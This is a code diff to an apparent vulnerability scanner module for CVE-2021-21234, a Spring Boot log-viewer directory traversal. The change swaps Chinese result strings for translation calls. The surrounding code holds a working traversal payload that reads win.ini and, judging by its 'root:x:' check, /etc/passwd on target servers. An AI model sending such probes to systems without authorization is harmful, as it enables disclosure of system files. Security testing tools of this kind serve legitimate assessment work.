@@ -3,6 +3,8 @@
 import aiohttp
 import asyncio
 
+from util.Translate import tr
+
 class CVE_2021_21234_Async:
     def __init__(self):
         self.payload1 = 'manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../'
@@ -35,20 +37,20 @@ class CVE_2021_21234_Async:
                 responses = await asyncio.gather(*tasks)
 
                 if any('MAPI' in str(resp) for resp in responses[:2]):
-                    result = "[+] 发现Spring Boot目录遍历漏洞且系统为Win\n"
+                    result = tr("v.21234.win")
                     result1 = f"{url + self.payload1}\n"
                     result2 = f"{url + self.payload2}"
                     return result + result1 + result2
                 elif any('root:x:' in str(resp) for resp in responses[2:]):
-                    result = "[+] 发现Spring Boot目录遍历漏洞且系统为Linux\n"
+                    result = tr("v.21234.linux")
                     result1 = f"{url + self.payload3}\n"
                     result2 = f"{url + self.payload4}"
                     return result + result1 + result2
                 else:
-                    result = f"[-] {url} 未发现Spring Boot目录遍历漏洞"
+                    result = tr("v.21234.none", url=url)
                     return result
         except Exception as e:
-            error = f"[error] {url} 未知错误 {e}"
+            error = tr("v.unknown", url=url, e=e)
             return error
     async def exp(self, url, proxies, ProxyStute):
         pass
